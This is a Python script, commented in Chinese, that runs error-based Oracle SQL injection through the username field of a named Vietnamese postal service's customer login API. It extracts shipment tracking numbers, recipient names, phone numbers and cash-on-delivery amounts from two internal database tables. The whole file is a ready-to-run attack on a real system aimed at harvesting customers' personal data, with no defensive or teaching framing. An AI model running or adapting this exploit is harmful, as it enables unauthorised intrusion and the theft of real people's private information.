#!/usr/bin/env python3
"""
提取真实运单号
"""

import requests
import json
import time

class TrackingExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def get_real_tracking_numbers(self):
        """提取真实运单号"""
        print("=" * 80)
        print("📦 提取真实运单号")
        print("=" * 80)
        
        date = '20251010'
        
        # 从SHIPMENT表提取
        print(f"\n从SHIPMENT表提取（2025-10-10）：")
        
        for i in range(1, 21):
            query = f"SELECT CODE||'|'||RECEIVER_NAME||'|'||RECEIVER_PHONE||'|'||COD_AMOUNT FROM (SELECT T.*, ROWNUM AS RN FROM EMS.SHIPMENT T WHERE CREATE_DATE='{date}') WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                code = parts[0] if len(parts) > 0 else ''
                name = parts[1] if len(parts) > 1 else ''
                phone = parts[2] if len(parts) > 2 else ''
                amount = parts[3] if len(parts) > 3 else ''
                
                print(f"\n{i}. 运单号: {code}")
                print(f"   收件人: {name}")
                print(f"   电话: {phone}")
                print(f"   代收: {amount} VND")
            
            time.sleep(0.3)
        
        # 从E1E2_PH表提取
        print(f"\n\n从E1E2_PH表提取（MABC）：")
        
        for i in range(1, 21):
            query = f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM (SELECT DISTINCT MABC, NGUOINHAN, DIENTHOAINHAN, SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE NGAY='{date}') WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                mabc = parts[0] if len(parts) > 0 else ''
                name = parts[1] if len(parts) > 1 else ''
                phone = parts[2] if len(parts) > 2 else ''
                amount = parts[3] if len(parts) > 3 else ''
                
                print(f"\n{i}. MABC: {mabc}")
                print(f"   收件人: {name}")
                print(f"   电话: {phone}")
                print(f"   代收: {amount} VND")
            
            time.sleep(0.3)
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.get_real_tracking_numbers()

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = TrackingExtractor(target_url)
    extractor.run()
